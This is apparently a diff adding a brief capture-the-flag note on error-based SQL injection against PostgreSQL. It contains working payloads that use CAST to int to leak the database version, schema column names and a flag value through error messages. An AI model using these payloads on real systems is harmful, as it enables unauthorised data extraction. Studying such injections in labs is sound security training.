@@ -1,0 +1,15 @@
+' OR 1 OR '
+
+Gives :
+ERROR: argument of OR must be type boolean, not type integer
+
+This error is from postgresql.
+
+We can make our own with the following :
+
+' AND 1337=CAST((SELECT version()) as int)--
+
+' AND 1337=CAST((SELECT table_name || '::' || column_name FROM information_schema.columns WHERE table_schema=current_schema() LIMIT 1 OFFSET 2) as int)--
+
+' AND 1337=CAST((SELECT flag FROM flagitoporlacarne) as int)--
+
